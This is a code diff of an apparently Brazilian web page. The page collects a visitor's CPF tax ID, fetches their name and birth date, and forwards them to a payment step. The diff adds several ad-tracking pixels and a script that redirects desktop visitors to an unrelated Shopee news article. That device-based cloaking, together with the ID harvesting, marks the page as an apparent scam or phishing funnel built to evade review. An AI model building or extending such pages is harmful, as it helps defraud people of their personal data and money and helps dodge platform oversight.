@@ -311,9 +311,44 @@
     </style>
 
     <!-- Pixel Facebook 1 -->
+    <script>
+        window.pixelId = "6a184246f1f2699f88b3ab4b";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
 
-    <!-- Tracker offline para Google Ads -->
-    <script src="/api/tracker.js"></script>
+    <!-- Pixel Facebook 2 -->
+    <script>
+        window.pixelId = "699511958e254c5ebc775636";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel UTMify -->
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+
+    <!-- Pixel Google (adicionado sem interferir nos pixels existentes) -->
+    <script>
+        window.googlePixelId = "6a1ecf677f95f02e48c8cff3";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+        document.head.appendChild(a);
+    </script>
+
+    <script type="text/javascript">
+        if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+            window.location.replace('https://mundologistica.com.br/noticias/shopee-amplia-entregas-com-mais-de-2-mil-pontos-de-retirada');
+        }
+    </script>
 </head>
 <body>
     <div class="bg-decoration">
@@ -406,12 +441,6 @@
 
         console.log('Parâmetros recebidos na página de cadastro:', getUrlParams());
 
-        // Rastreamento: Entrada na etapa de validacao CPF
-        Tracker.event('stage_entry', {
-            stage: 'cpf_analysis',
-            url: window.location.href
-        });
-
         // =======================================================
         // SISTEMA DE DADOS DO USUÁRIO
         // =======================================================
@@ -482,14 +511,7 @@
         document.getElementById('continuar-btn').addEventListener('click', async function() {
             const cpf = document.getElementById('cpf').value;
             const cpfLimpo = cpf.replace(/\D/g, '');
-            if (cpfLimpo.length !== 11) {
-                Tracker.event('validation_error', {
-                    stage: 'cpf_analysis',
-                    field: 'cpf',
-                    error: 'CPF invalido (tamanho)'
-                });
-                return alert('CPF inválido. Verifique e tente novamente.');
-            }
+            if (cpfLimpo.length !== 11) return alert('CPF inválido. Verifique e tente novamente.');
 
             const btn = document.getElementById('continuar-btn');
             btn.disabled = true;
@@ -498,17 +520,8 @@
             document.getElementById('form-screen').classList.add('hidden');
             document.getElementById('loading-screen').classList.remove('hidden');
 
-            // Rastreamento: Inicio da consulta de CPF
-            const stageStartTime = Date.now();
-            Tracker.event('cpf_query_start', {
-                stage: 'cpf_analysis',
-                cpf_masked: cpfLimpo.substring(0, 3) + '***' + cpfLimpo.substring(9)
-            });
-
             try {
                 const userData = await consultarCPF(cpf);
-                const queryDuration = Date.now() - stageStartTime;
-
                 currentUserData = {
                     cpf: cpf,
                     cpf_limpo: cpfLimpo,
@@ -523,29 +536,11 @@
 
                 UserData.update({ ...currentUserData, etapa: 'dados_cadastrados' });
                 console.log('Dados do usuário salvos:', currentUserData);
-
-                // Rastreamento: CPF validado com sucesso
-                Tracker.event('stage_exit', {
-                    stage: 'cpf_analysis',
-                    status: 'success',
-                    timeOnStage: queryDuration,
-                    userName: userData.nome
-                });
             } catch (e) {
-                const queryDuration = Date.now() - stageStartTime;
-
                 document.getElementById('loading-screen').classList.add('hidden');
                 document.getElementById('form-screen').classList.remove('hidden');
                 btn.disabled = false;
                 btn.textContent = 'Continuar';
-
-                // Rastreamento: Erro na consulta de CPF
-                Tracker.event('cpf_query_error', {
-                    stage: 'cpf_analysis',
-                    error: e.message,
-                    timeOnStage: queryDuration
-                });
-
                 alert(e.message || 'CPF não encontrado. Verifique e tente novamente.');
             }
         });
@@ -560,12 +555,12 @@
                 nome: currentUserData.nome,
                 data_nascimento: currentUserData.data_nascimento
             };
-
-            const nextUrl = buildUrlWithParams('pagamento.html', paramsToSend);
+            
+            const nextUrl = buildUrlWithParams('2.html', paramsToSend);
             console.log('Redirecionando para:', nextUrl);
             console.log('Parâmetros preservados:', getUrlParams());
             console.log('Novos parâmetros adicionados:', paramsToSend);
-
+            
             window.location.href = nextUrl;
         });
     </script>
